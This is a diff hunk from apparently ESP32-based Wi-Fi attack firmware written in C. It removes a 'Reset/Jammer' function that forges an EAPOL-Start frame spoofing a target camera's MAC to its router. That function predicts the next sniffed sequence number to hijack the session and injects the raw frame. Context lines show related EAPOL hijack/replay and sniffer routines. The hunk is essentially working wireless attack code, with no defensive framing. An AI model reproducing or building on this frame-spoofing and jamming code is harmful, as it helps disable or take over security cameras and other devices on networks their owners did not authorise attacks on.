@@ -201,25 +201,6 @@ void send_smart_eapol(int msg_num, bool use_hijack, int replay_offset) {
     esp_wifi_80211_tx(WIFI_IF_STA, packet_buffer, packet_size, true);
 }
 
-// --- EAPOL START (Reset/Jammer) ---
-void send_eapol_start() {
-    memset(packet_buffer, 0, 100);
-    packet_buffer[0]=0x08; packet_buffer[1]=0x01; // Data Type
-    memcpy(&packet_buffer[4], target_router_mac, 6); // To: Router
-    memcpy(&packet_buffer[10], target_camera_mac, 6); // From: Camera
-    memcpy(&packet_buffer[16], target_router_mac, 6); // BSSID
-    
-    // Hijack Sequence + 1 per anticipare
-    uint16_t seq = sniffer_seq_num + 1;
-    packet_buffer[22] = (seq & 0x0F) << 4; packet_buffer[23] = (seq >> 4) & 0xFF;
-
-    packet_buffer[24]=0xAA; packet_buffer[25]=0xAA; packet_buffer[26]=0x03;
-    packet_buffer[30]=0x88; packet_buffer[31]=0x8E;
-    packet_buffer[32]=0x01; packet_buffer[33]=0x01; // EAPOL Start
-    
-    esp_wifi_80211_tx(WIFI_IF_STA, packet_buffer, 36, true);
-}
-
 // --- SNIFFER CALLBACK ---
 void sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
     wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
